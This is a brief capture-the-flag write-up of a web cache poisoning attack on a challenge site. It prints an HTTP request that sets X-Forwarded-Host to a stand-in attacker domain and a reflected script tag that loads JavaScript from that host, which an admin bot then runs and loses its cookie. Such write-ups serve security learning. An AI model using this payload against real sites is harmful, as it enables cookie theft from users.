XploitX: Web Cache Poisoning & HTTP Desync

Exploiting unkeyed HTTP request headers (X-Forwarded-Host) on Cloudflare edge caches to store malicious scripts on cached landing pages.

Reshma Al (Coldcoffee) · 12 May 2026 · 1 min read
Captured Flag XPLOIT{c4ch3_p01s0n1ng_unm4sk3d_h34d3r_tr1ck}

1. Cache Key Identification

Probing the target web frontend using Burp Suite:

GET /static/main.js HTTP/1.1
Host: xploitx-challenge.io
X-Forwarded-Host: evil-attacker.com

The backend reflected X-Forwarded-Host directly into script import attributes:

<script src="https://evil-attacker.com/assets/vendor.js"></script>

2. Edge Cache Poisoning

Because X-Forwarded-Host was unkeyed in Cloudflare cache headers, issuing this request cached the poisoned response globally for 3600 seconds. When the administrative verification bot accessed the homepage, our external script captured the admin cookie containing the flag.
